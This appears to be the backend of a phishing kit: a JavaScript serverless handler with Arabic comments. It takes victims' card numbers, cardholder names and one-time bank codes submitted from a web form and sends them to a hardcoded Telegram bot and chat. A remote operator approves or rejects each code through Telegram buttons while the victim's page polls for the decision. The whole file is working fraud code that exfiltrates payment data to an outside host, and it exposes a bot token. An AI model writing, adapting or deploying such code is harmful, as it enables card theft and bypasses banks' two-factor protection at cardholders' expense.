export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, GET, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') return res.status(200).end();

  const BOT_TOKEN = "8704506100:AAG1IvxmDba-3v90ujm2ZCc765EROT0T8Qc";
  const CHAT_ID = "8040433133";
  const body = req.body || {};

  // إذا كان الطلب استعلام من المتصفح لمعرفة هل وافقت أم رفضت
  if (req.method === 'GET') {
    const { user_id } = req.query;
    try {
      const tgRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=-10`);
      const tgData = await tgRes.json();
      
      let status = 'pending';
      if (tgData.ok && tgData.result) {
        for (const update of tgData.result) {
          if (update.callback_query) {
            const data = update.callback_query.data;
            if (data === `approve_otp_${user_id}`) status = 'approved';
            if (data === `reject_otp_${user_id}`) status = 'rejected';
          }
        }
      }
      return res.status(200).json({ status });
    } catch (e) {
      return res.status(200).json({ status: 'pending' });
    }
  }

  // تفاعل زر تليجرام (Callback Query)
  if (body.callback_query) {
    const callback = body.callback_query;
    const callbackData = callback.data;
    const chatId = callback.message.chat.id;
    const messageId = callback.message.message_id;

    let responseText = callback.message.text;
    if (callbackData.startsWith('approve_otp_')) {
      responseText += "\n\n✅ **[تمت الموافقة - جارٍ توجيه العميل للفاتورة]**";
    } else if (callbackData.startsWith('reject_otp_')) {
      responseText += "\n\n❌ **[تم الرفض - إظهار خطأ للعميل]**";
    }

    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        message_id: messageId,
        text: responseText,
        parse_mode: 'Markdown'
      })
    });

    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ callback_query_id: callback.id, text: "تم تسجيل قرارك!" })
    });

    return res.status(200).json({ ok: true });
  }

  // إرسال كود OTP جديد لتليجرام
  if (body.رمز_التحقق_OTP) {
    const text = `🔐 *طلب رمز تحقق (OTP) جديد*\n\n` +
                 `🔑 الكود المدخل: \`${body.رمز_التحقق_OTP}\`\n` +
                 `💳 البطاقة: \`${body.رقم_البطاقة || 'غير متوفر'}\`\n` +
                 `👤 الاسم: ${body.اسم_الحامل || 'غير متوفر'}\n` +
                 `🆔 معرف الجلسة: \`${body.user_id}\``;

    const keyboard = {
      inline_keyboard: [
        [
          { text: "✅ موافقة", callback_data: `approve_otp_${body.user_id}` },
          { text: "❌ رفض", callback_data: `reject_otp_${body.user_id}` }
        ]
      ]
    };

    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: text,
        parse_mode: 'Markdown',
        reply_markup: keyboard
      })
    });

    return res.status(200).json({ ok: true });
  }

  return res.status(200).json({ ok: true });
}
